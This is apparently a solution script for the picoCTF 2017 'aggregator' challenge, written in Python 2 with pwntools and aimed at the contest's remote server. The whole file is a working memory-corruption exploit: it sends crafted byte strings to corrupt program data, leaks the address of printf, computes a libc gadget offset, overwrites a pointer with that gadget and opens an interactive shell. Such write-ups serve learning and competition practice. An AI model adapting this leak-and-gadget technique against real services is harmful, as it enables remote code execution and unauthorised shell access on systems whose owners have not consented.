from pwn import *

#r = process('./aggregator')
r = remote('shell2017.picoctf.com', 7785)
def run_cmd(cmd, line=False):
    r.sendline(cmd)
    if line:
        return r.recvline()

run_cmd('02-02-2014 11111')
run_cmd('a+ 02-2014', True)
run_cmd('~ 02-02-2014')
run_cmd('#{}{}{}{}{}{}{}{}{}'.format('A'*7, '\x02', 'B'*7, '\xff'*8, '\x01', '\x00'*7, '\x00', '\x00'*6, '\x08\x1f\x60\x00\x00\x00\x00\x00\x02'))
r.recvlines(1)
printf = int(run_cmd('a+ 02-2014', True))
print 'printf = {}'.format(hex(printf))
gadget = printf - 63584
print 'gadget = {}'.format(hex(gadget))
#run_cmd('02-02-2014 22222')
run_cmd('02-03-2014 11111')
raw_input()
run_cmd('~ 02-03-2014')
print hex(int(run_cmd('a+ 03-2014', True)))
#run_cmd('#{}{}{}{}{}{}'.format('A'*7, '\x03', 'B'*7, '\xff'*8, p64((0x601f00 - 0x0a00)/8), '\x00'))
run_cmd('\x00\x00\x00\x00\x00\x00\x00\x00{}{}{}{}{}'.format('\x03', 'B'*7, '\xff'*8, p64((0x601f00)/8), '\x00'))
run_cmd('02-03-2014 {}'.format(gadget))

r.interactive()

